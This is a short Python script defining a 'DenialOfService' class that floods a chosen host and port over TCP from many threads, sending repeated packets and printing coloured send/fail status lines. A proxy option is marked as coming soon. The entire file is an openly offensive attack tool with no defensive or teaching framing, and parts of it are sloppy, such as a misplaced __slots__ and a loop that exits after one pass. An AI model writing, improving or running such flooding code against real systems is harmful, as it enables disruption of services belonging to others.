import threading
import socket

class DenialOfService:
  def __init__(self, target: str, port: int) -> None:
    __slots__ = ("colors", "target", "port", "address", "sends")
    
    self.colors = {"Red": "\033[01;31m",
                  "Green": "\033[01;32m",
                   "End": "\033[0m"
                  }
    self.target = target
    self.port = port
    self.address = (self.target, self.port)
    self.sends = 0

  def tcp(self, packages: int, bytes: int) -> None:
    while 1:
      try:
          tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          tcp.connect(self.address)
          for i in range(packages):
              tcp.send(str(bytes).encode("utf-8"))
              print(f"{self.colors['Green']}[SEND] Target >> {self.target} | Proxy >> Em Breve | Port >> {self.port}{self.colors['End']}")
      except:
          print(f"{self.colors['Red']}[NOT SEND] Target >> {self.target} | Proxy >> Em Breve | Port >> {self.port}{self.colors['End']}")
      tcp.close()
      break

  def multi(self, threads: int, bytes: int, pack: int) -> None:
    clients_th = []
    for i in range(threads):
      th = threading.Thread(target=self.tcp, args=(pack, bytes))
      clients_th.append(th)
      th.start()


